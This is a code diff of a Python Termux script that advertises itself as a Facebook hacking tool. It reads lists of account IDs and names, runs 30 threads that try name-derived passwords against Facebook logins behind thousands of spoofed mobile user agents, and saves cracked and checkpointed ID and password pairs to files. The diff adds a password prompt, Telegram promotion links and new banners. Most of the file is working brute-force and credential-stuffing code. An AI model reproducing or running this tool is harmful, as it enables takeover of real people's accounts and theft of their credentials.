@@ -1,6 +1,57 @@
-from os import path
 import webbrowser
-import os,base64,zlib,pip,urllib,time
+import webbrowser
+webbrowser.open('')
+import sys
+import time
+import os
+import os,base64
+import requests,bs4,json,os,sys,random,datetime,time,re
+import urllib3,rich,base64
+from rich.table import Table as me
+from rich.console import Console as sol
+from bs4 import BeautifulSoup as sop
+from bs4 import BeautifulSoup as parser
+from concurrent.futures import ThreadPoolExecutor as tred
+from rich.console import Group as gp
+from rich.panel import Panel as nel
+from rich import print as cetak
+from rich.markdown import Markdown as mark
+from rich.columns import Columns as col
+from rich import print as rprint
+from rich import pretty
+from rich.text import Text as tekz
+import os
+import requests
+import webbrowser
+webbrowser.open('https://t.me/Sajad_stor')
+Z = '\033[1;31m' 
+C = '\033[1;33m'
+Z1 = '\033[2;31m' 
+F = '\033[2;32m' 
+A = '\033[2;34m'
+X  = '\033[1;33m'
+B = '\033[2;36m'
+Y = '\033[1;34m'
+W = "\033[1;37m"
+LO = '––'
+logo = f'''⊶⊶⊶⊶⊷⊷⊷⊷⊶⊶⊶⊶⊷⊷⊷⊷⊶⊶⊶⊶⊷⊷⊷⊷⊶⊶⊶⊶⊷⊷⊷⊷⊶⊶⊶⊶⊷⊷⊷⊷⊶⊶⊶⊶⊷⊷⊷⊷
+{Z}Telegram / PRO TERMUX       
+{W}Telegram / @H0773
+{X}Telegram / @z7_6z
+{Z}Telegram / @BB22FF
+{W} github  / 
+⊶⊶⊶⊶⊷⊷⊷⊷⊶⊶⊶⊶⊷⊷⊷⊷⊶⊶⊶⊶⊷⊷⊷⊷⊶⊶⊶⊶⊷⊷⊷⊷⊶⊶⊶⊶⊷⊷⊷⊷⊶⊶⊶⊶⊷⊷⊷⊷                          
+  < اللهـم قـوة مـن صميـم لطفـك 🖤 >                               
+'''
+
+print(logo)         
+a7aac ="PRO"
+for i in range (2827227272) :
+      pwd = input (f"  {X}             ENTER {Z} PASS {B}:{F} ")
+      j = 2827227272
+      if ( pwd==a7aac) :               
+              break  
+              os.system('clear')         
 E = '\033[1;31m'
 B = '\033[2;36m'
 G = '\033[1;32m' #ط§ط®ط¶ط±
@@ -18,6 +69,7 @@ try:
 except ModuleNotFoundError:
         os.system(f'pip install requests futures==2 > /dev/null')
         os.system('git pull')
+        
 except:pass
 fbks=(f'com.facebook.adsmanager','com.facebook.lite','com.facebook.orca','com.facebook.katana','com.facebook.mlite')
 gt = random.choice(['GT-1015','GT-1020','GT-1030','GT-1035','GT-1040','GT-1045','GT-1050','GT-1240','GT-1440','GT-1450','GT-18190','GT-18262','GT-19060I','GT-19082','GT-19083','GT-19105','GT-19152','GT-19192','GT-19300','GT-19505','GT-2000','GT-20000','GT-200s','GT-3000','GT-414XOP','GT-6918','GT-7010','GT-7020','GT-7030','GT-7040','GT-7050','GT-7100','GT-7105','GT-7110','GT-7205','GT-7210','GT-7240R','GT-7245','GT-7303','GT-7310','GT-7320','GT-7325','GT-7326','GT-7340','GT-7405','GT-7550   5GT-8005','GT-8010','GT-81','GT-810','GT-8105','GT-8110','GT-8220S','GT-8410','GT-9300','GT-9320','GT-93G','GT-A7100','GT-A9500','GT-ANDROID','GT-B2710','GT-B5330','GT-B5330B','GT-B5330L','GT-B5330ZKAINU','GT-B5510','GT-B5512','GT-B5722','GT-B7510','GT-B7722','GT-B7810','GT-B9150','GT-B9388','GT-C3010','GT-C3262','GT-C3310R','GT-C3312','GT-C3312R','GT-C3313T','GT-C3322','GT-C3322i','GT-C3520','GT-C3520I','GT-C3592','GT-C3595','GT-C3782','GT-C6712','GT-E1282T','GT-E1500','GT-E2200','GT-E2202','GT-E2250','GT-E2252','GT-E2600','GT-E2652W','GT-E3210','GT-E3309','GT-E3309I','GT-E3309T','GT-G530H','GT-g900f','GT-G930F','GT-H9500','GT-I5508','GT-I5801','GT-I6410','GT-I8150','GT-I8160OKLTPA','GT-I8160ZWLTTT','GT-I8258','GT-I8262D','GT-I8268','GT-I8505','GT-I8530BAABTU','GT-I8530BALCHO','GT-I8530BALTTT','GT-I8550E','GT-i8700','GT-I8750','GT-I900','GT-I9008L','GT-i9040','GT-I9080E','GT-I9082C','GT-I9082EWAINU','GT-I9082i','GT-I9100G','GT-I9100LKLCHT','GT-I9100M','GT-I9100P','GT-I9100T','GT-I9105UANDBT','GT-I9128E','GT-I9128I','GT-I9128V','GT-I9158P','GT-I9158V','GT-I9168I','GT-I9192I','GT-I9195H','GT-I9195L','GT-I9250','GT-I9303I','GT-I9305N','GT-I9308I','GT-I9505G','GT-I9505X','GT-I9507V','GT-I9600','GT-m190','GT-M5650','GT-mini','GT-N5000S','GT-N5100','GT-N5105','GT-N5110','GT-N5120','GT-N7000B','GT-N7005','GT-N7100T','GT-N7102','GT-N7105','GT-N7105T','GT-N7108','GT-N7108D','GT-N8000','GT-N8005','GT-N8010','GT-N8020','GT-N9000','GT-N9505','GT-P1000CWAXSA','GT-P1000M','GT-P1000T','GT-P1010','GT-P3100B','GT-P3105','GT-P3108','GT-P3110','GT-P5100','GT-P5200','GT-P5210XD1','GT-P5220','GT-P6200','GT-P6200L','GT-P6201','GT-P6210','GT-P6211','GT-P6800','GT-P7100','GT-P7300','GT-P7300B','GT-P7310','GT-P7320','GT-P7500D','GT-P7500M','GT-P7500R','GT-P7500V','GT-P7501','GT-P7511','GT-S3330','GT-S3332','GT-S3333','GT-S3370','GT-S3518','GT-S3570','GT-S3600i','GT-S3650','GT-S3653W','GT-S3770K','GT-S3770M','GT-S3800W','GT-S3802','GT-S3850','GT-S5220','GT-S5220R','GT-S5222','GT-S5230','GT-S5230W','GT-S5233T','GT-s5233w','GT-S5250','GT-S5253','GT-s5260','GT-S5280','GT-S5282','GT-S5283B','GT-S5292','GT-S5300','GT-S5300L','GT-S5301','GT-S5301B','GT-S5301L','GT-S5302','GT-S5302B','GT-S5303','GT-S5303B','GT-S5310','GT-S5310B','GT-S5310C','GT-S5310E','GT-S5310G','GT-S5310I','GT-S5310L','GT-S5310M','GT-S5310N','GT-S5312','GT-S5312B','GT-S5312C','GT-S5312L','GT-S5330','GT-S5360','GT-S5360B','GT-S5360L','GT-S5360T','GT-S5363','GT-S5367','GT-S5369','GT-S5380','GT-S5380D','GT-S5500','GT-S5560','GT-S5560i','GT-S5570B','GT-S5570I','GT-S5570L','GT-S5578','GT-S5600','GT-S5603','GT-S5610','GT-S5610K','GT-S5611','GT-S5620','GT-S5670','GT-S5670B','GT-S5670HKBZTA','GT-S5690','GT-S5690R','GT-S5830','GT-S5830D','GT-S5830G','GT-S5830i','GT-S5830L','GT-S5830M','GT-S5830T','GT-S5830V','GT-S5831i','GT-S5838','GT-S5839i','GT-S6010','GT-S6010BBABTU','GT-S6012','GT-S6012B','GT-S6102','GT-S6102B','GT-S6293T','GT-S6310B','GT-S6310ZWAMID','GT-S6312','GT-S6313T','GT-S6352','GT-S6500','GT-S6500D','GT-S6500L','GT-S6790','GT-S6790L','GT-S6790N','GT-S6792L','GT-S6800','GT-S6800HKAXFA','GT-S6802','GT-S6810','GT-S6810B','GT-S6810E','GT-S6810L','GT-S6810M','GT-S6810MBASER','GT-S6810P','GT-S6812','GT-S6812B','GT-S6812C','GT-S6812i','GT-S6818','GT-S6818V','GT-S7230E','GT-S7233E','GT-S7250D','GT-S7262','GT-S7270','GT-S7270L','GT-S7272','GT-S7272C','GT-S7273T','GT-S7278','GT-S7278U','GT-S7390','GT-S7390G','GT-S7390L','GT-S7392','GT-S7392L','GT-S7500','GT-S7500ABABTU','GT-S7500ABADBT','GT-S7500ABTTLP','GT-S7500CWADBT','GT-S7500L','GT-S7500T','GT-S7560','GT-S7560M','GT-S7562','GT-S7562C','GT-S7562i','GT-S7562L','GT-S7566','GT-S7568','GT-S7568I','GT-S7572','GT-S7580E','GT-S7583T','GT-S758X','GT-S7592','GT-S7710','GT-S7710L','GT-S7898','GT-S7898I','GT-S8500','GT-S8530','GT-S8600','GT-STB919','GT-T140','GT-T150','GT-V8a','GT-V8i','GT-VC818','GT-VM919S','GT-W131','GT-W153','GT-X831','GT-X853','GT-X870','GT-X890','GT-Y8750'])
@@ -60,6 +112,7 @@ for agent in range(10000):
         l='Mobile Safari/537.36[FBAN/EMA;FBLC/en_GB;FBAV/297.0.0.13.113;]'
         fullagnt=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
         ugen.append(fullagnt)
+        
         
 for agent in range(10000):
         aa='Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X)'
@@ -110,17 +163,30 @@ def uaku():
 
 
 logo = """ 
-\033[0;92m
-                     \33[0;41m [<<tele:@z7_6z>>]\033[0;92m
-                      \33[0;41m[<<py:@z7_6z>>]\033[0;92m
-channel:@PRoacx
-\33[0;41m {<<<<<PRO>>>>} \033[0;92m    
+                                     
+
+ ▄▄▄▄▄▄▄▄▄▄▄  ▄         ▄ 
+▐░░░░░░░░░░░▌▐░▌       ▐░▌
+▐░█▀▀▀▀▀▀▀▀▀ ▐░▌       ▐░▌  \033[1;31m* WELCOME TO THE  : IRAQ
+▐░▌          ▐░▌       ▐░▌
+▐░▌          ▐░█▄▄▄▄▄▄▄█░▌   \033[1;32m  + THE TOOL CONRAINS A FACEBOOK HACK WITH A TOOL
+▐░▌Kurdistan ▐░░░░░░░░░░░▌
+▐░▌           ▀▀▀▀▀▀▀▀▀█░▌                \033[1;33m      # DEVELOPER : GOLDEN
+▐░▌                    ▐░▌
+▐░█▄▄▄▄▄▄▄▄▄           ▐░▌
+▐░░░░░░░░░░░▌  P R O  ▐░▌
+ ▀▀▀▀▀▀▀▀▀▀▀            ▀ 
+
+                   \033[1;33m      # update : 0.3
+ 
+
+ 
 """
 os.system('clear')
 print(logo)
 
 def linex():
-        print(47*'\033[1;31mâ–¬\033[1;37m')
+        print(47*'\033[1;31m–¬\033[1;37m')
 def clear():
         os.system(f'clear')
         print(logo)
@@ -136,10 +202,10 @@ os.system('git pull')
 
 def ALSOLTAN():
 	clear()
-	print('\33[0;41m القائمه \033[0;92m')
-	print(f'{G}(1){M} اضغط 1 لتشغيل ')
-	print(f"{G}(2){A}اضغط 2 للخروج ")
-	me=input(f':  ادخل ما تريد')
+	print('\033[0;41m ﺔﻤﺋﺎﻘﻟﺍ \033[0;92m')
+	print(f'{G}(1){M} GO FILE ')
+	print(f"{G}(2){A} EXIT  ")
+	me=input(f':  ☞')
 	
 	if me in ["2", "02"]:
 	    exit()
@@ -151,9 +217,9 @@ def ALSOLTAN():
 		try:
 			fo = open(file,'r').read().splitlines()
 		except FileNotFoundError:
-			print(f' {E}يرجأ ادخل ملف الصحيح')
+			print(f' {E}ﺢﻴﺤﺼﻟﺍ ﻒﻠﻣ ﻞﺧﺩﺍ ﺊﺟﺮﻳ')
 			exit()
-		print(f' [\033[1;31m1\033[1;37m] PRO  ')
+		print(f' [\033[1;31m1\033[1;37m] Method \033[1;32m1\033[1;37m [\033[1;32mAll ids\033[1;37m] \n [\033[1;31m2\033[1;37m] Method \033[1;32m2\033[1;37m [\033[1;32mold ids\033[1;37m] \n [\033[1;31m3\033[1;37m] Method \033[1;32m3\033[1;37m [\033[1;32mNew ids\033[1;37m]  ')
 		mthd=input(f' [\033[1;32m\033[1;37m] Choice : ')
 		plist=[]
 		try:
@@ -172,7 +238,7 @@ def ALSOLTAN():
 		with tred(max_workers=30) as crack_submit:
 			clear()
 			total_ids = str(len(fo))
-			print(f' Total Account : \033[1;32m'+total_ids+f' \n \033[1;37mPRO : \033[1;32mM{mthd}\033[1;37m')
+			print(f' Total Account : \033[1;32m'+total_ids+f' \n \033[1;37mMethod : \033[1;32mM{mthd}\033[1;37m')
 			linex()
 			for user in fo:
 				ids,names = user.split('|')
@@ -198,7 +264,7 @@ def ALSOLTAN():
 				
 def m1(ids,names,passlist):
         global loop,oks,cps
-        sys.stdout.write(f'\r\r\033[1;37m [PRO] \033[1;36m\033[1;37m %s \033[1;36m\033[1;37m OK \033[1;36m\033[1;37m [\033[1;32m%s\033[1;37m]'%(loop,len(oks)));sys.stdout.flush()
+        sys.stdout.write(f'\r\r\033[1;37m ✵ P R O ✵ \033[1;36m\033[1;37m %s \033[1;36m\033[1;37m OK \033[1;36m\033[1;37m [\033[1;32m%s\033[1;37m]'%(loop,len(oks)));sys.stdout.flush()
         session = requests.Session()
         try:
                 first = names.split(f' ')[0]
@@ -219,16 +285,16 @@ def m1(ids,names,passlist):
                         if "c_user" in ALSOLTAN:
                                 coki=session.cookies.get_dict()
                                 kuki = (f";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
-                                print(f'\r\r\033[1;32m [PRO\033[1;36m\033[1;37m\033[1;32mOK] %s \033[1;36mâ\033[1;37m\033[1;32m %s'%(ids,pas))
+                                print(f'\r\r\033[1;32m ☛ G o o D ☚\033[1;36m\033[1;37m\033[1;32mOK] %s \033[1;36m\033[1;37m\033[1;32m %s'%(ids,pas))
                                 #cek_apk(session,coki)
                                 #print(f'\033[1;36m [Cookie]\033[1;37m : '+coki)
-                                open(f'/sdcard/PRO OK .txt', 'a').write(ids+'|'+pas+'\n')
+                                open(f'/sdcard/ALSOLTANâ€¢OKâ€¢M1.txt', 'a').write(ids+'|'+pas+'\n')
                                 oks.append(ids)
                                 break
                         elif 'checkpoint' in ALSOLTAN:
                                 if 'y' in pcp:
-                                        print(f'\r\r\x1b[38;5;208m [PRO] '+ids+' â€¢ '+pas+'\033[1;97m')
-                                        open(f'/sdcard/PROCP.txt', 'a').write(ids+'|'+pas+'\n')
+                                        print(f'\r\r\x1b[38;5;208m ☛ G o o D ☚ '+ids+'  '+pas+'\033[1;97m')
+                                        open(f'/sdcard/ALSOLTANCP.txt', 'a').write(ids+'|'+pas+'\n')
                                         cps.append(ids)
                                         break
                                 else:
@@ -241,7 +307,7 @@ def m1(ids,names,passlist):
                         
 def m3(ids,names,passlist):
         global loop,oks,cps
-        sys.stdout.write(f'\r\r\033[1;37m [PRO] \033[1;36m\033[1;37m %s \033[1;36m\033[1;37m OK \033[1;36m\033[1;37m [\033[1;32m%s\033[1;37m]'%(loop,len(oks)));sys.stdout.flush()
+        sys.stdout.write(f'\r\r\033[1;33m ☛ G o o D ☚ \033[1;34m\033[1;37m %s \033[1;35m\033[1;32m OK \033[1;36m\033[1;38m [\033[1;31m%s\033[1;30m]'%(loop,len(oks)));sys.stdout.flush()
         session = requests.Session()
         try:
                 first = names.split(f' ')[0]
@@ -262,7 +328,7 @@ def m3(ids,names,passlist):
                         if "c_user" in ALSOLTAN:
                                 coki=session.cookies.get_dict()
                                 kuki = (f";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
-                                print(f'\r\r\033[1;32m [PRO\033[1;36m\033[1;37m\033[1;32mOK] %s \033[1;36m\033[1;37m\033[1;32m %s'%(ids,pas))
+                                print(f'\r\r\033[1;32m ☛ G o o D ☚\033[1;33m\033[1;34m\033[1;35mOK] %s \033[1;36m\033[1;37m\033[1;37m %s'%(ids,pas))
                                 #cek_apk(session,coki)
                                 #print(f'\033[1;36m [Cookie]\033[1;37m : '+coki)
                                 open(f'/sdcard/ALSOLTANâ€¢OKâ€¢M3.txt', 'a').write(ids+'|'+pas+'\n')
@@ -284,7 +350,7 @@ def m3(ids,names,passlist):
 
 def m2(ids,names,passlist):
         global loop,oks,cps
-        sys.stdout.write(f'\r\r\033[1;37m [PRO] \033[1;36m\033[1;37m %s \033[1;36m\033[1;37m OK \033[1;36m\033[1;37m [\033[1;32m%s\033[1;37m]'%(loop,len(oks)));sys.stdout.flush()
+        sys.stdout.write(f'\r\r\033[1;31m ☛ G o o D ☚ \033[1;32m\033[1;33m %s \033[1;34m\033[1;38m OK \033[1;37mâ€¢\033[1;33m [\033[1;31m%s\033[1;39m]'%(loop,len(oks)));sys.stdout.flush()
         session = requests.Session()
         try:
                 first = names.split(f' ')[0]
@@ -305,7 +371,7 @@ def m2(ids,names,passlist):
                         if "c_user" in ALSOLTAN:
                                 coki=session.cookies.get_dict()
                                 kuki = (f";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
-                                print(f'\r\r\033[1;32m [PRO\033[1;36mâ€¢\033[1;37m\033[1;32mOK] %s \033[1;36mâ€¢\033[1;37m\033[1;32m %s'%(ids,pas))
+                                print(f'\r\r\033[1;32m [ALSOLTAN\033[1;36mâ€¢\033[1;37m\033[1;32mOK] %s \033[1;36mâ€¢\033[1;37m\033[1;32m %s'%(ids,pas))
                                 #cek_apk(session,coki)
                                 #print(f'\033[1;36m [Cookie]\033[1;37m : '+coki)
                                 open(f'/sdcard/ALSOLTANâ€¢OKâ€¢M2.txt', 'a').write(ids+'|'+pas+'\n')
@@ -313,8 +379,8 @@ def m2(ids,names,passlist):
                                 break
                         elif 'checkpoint' in ALSOLTAN:
                                 if 'y' in pcp:
-                                        print(f'\r\r\x1b[38;5;208m [ALSOLTANâ€¢CP] '+ids+' â€¢ '+pas+'\033[1;97m')
-                                        open(f'/sdcard/ALSOLTANâ€¢CP.txt', 'a').write(ids+'|'+pas+'\n')
+                                        print(f'\r\r\x1b[38;5;208m ☛ B A D ☚ '+ids+'  '+pas+'\033[1;97m')
+                                        open(f'/sdcard/ALSOLTANCP.txt', 'a').write(ids+'|'+pas+'\n')
                                         cps.append(ids)
                                         break
                                 else:
@@ -327,7 +393,7 @@ def m2(ids,names,passlist):
 
 def m4(ids,names,passlist):
         global loop,oks,cps
-        sys.stdout.write(f'\r\r\033[1;37m [PRO] \033[1;36m\033[1;37m %s \033[1;36m\033[1;37m OK \033[1;36m\033[1;37m [\033[1;32m%s\033[1;37m]'%(loop,len(oks)));sys.stdout.flush()
+        sys.stdout.write(f'\r\r\033[1;32m ☛ G o o D ☚ \033[1;36m\033[1;37m %s \033[1;36mâ€¢\033[1;37m OK \033[1;36mâ€¢\033[1;37m [\033[1;32m%s\033[1;37m]'%(loop,len(oks)));sys.stdout.flush()
         session = requests.Session()
         try:
                 first = names.split(f' ')[0]
@@ -348,7 +414,7 @@ def m4(ids,names,passlist):
                         if "c_user" in ALSOLTAN:
                                 coki=session.cookies.get_dict()
                                 kuki = (f";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
-                                print(f'\r\r\033[1;32m [PRO\033[1;36m\033[1;37m\033[1;32mOK] %s \033[1;36m\033[1;37m\033[1;32m %s'%(ids,pas))
+                                print(f'\r\r\033[1;32m [ALSOLTAN\033[1;36mâ€¢\033[1;37m\033[1;32mOK] %s \033[1;36mâ€¢\033[1;37m\033[1;32m %s'%(ids,pas))
                                 #cek_apk(session,coki)
                                 #print(f'\033[1;36m [Cookie]\033[1;37m : '+coki)
                                 open(f'/sdcard/ALSOLTANâ€¢OKâ€¢M4.txt', 'a').write(ids+'|'+pas+'\n')
@@ -356,7 +422,7 @@ def m4(ids,names,passlist):
                                 break
                         elif 'checkpoint' in ALSOLTAN:
                                 if 'y' in pcp:
-                                        print(f'\r\r\x1b[38;5;208m [PRO] '+ids+'  '+pas+'\033[1;97m')
+                                        print(f'\r\r\x1b[38;5;208m ☛ B A D ☚ '+ids+'  '+pas+'\033[1;97m')
                                         open(f'/sdcard/ALSOLTANâ€¢CP.txt', 'a').write(ids+'|'+pas+'\n')
                                         cps.append(ids)
                                         break
@@ -370,3 +436,5 @@ def m4(ids,names,passlist):
 
 
 ALSOLTAN()
+
+
